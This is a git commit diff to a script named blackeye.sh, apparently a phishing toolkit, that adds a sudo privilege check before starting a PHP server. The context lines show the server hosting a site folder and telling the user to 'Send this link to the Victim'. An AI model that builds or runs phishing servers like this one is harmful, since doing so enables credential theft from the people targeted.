f84c018c37f2032060fe92998f408f34f3beaa22
Barae Erriyachy <93267708+baraeerriyachy@users.noreply.github.com>
2022-02-14 21:36:26 +0100

    Update blackeye.sh

--- blackeye.sh
+++ blackeye.sh
@@ -428,6 +428,11 @@ printf "\n\e[1;92m[\e[0m*\e[1;92m] Put your local IP (Default %s): " $default_ip
 read ip
 ip="${ip:-${default_ip}}"
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+
+if [ "$UID" -ne 0 -a "$EUID" -ne 0 ]; then
+    sudo -v
+fi
+
 sudo php -t "sites/$server" -S "$ip:80" > /dev/null 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $ip
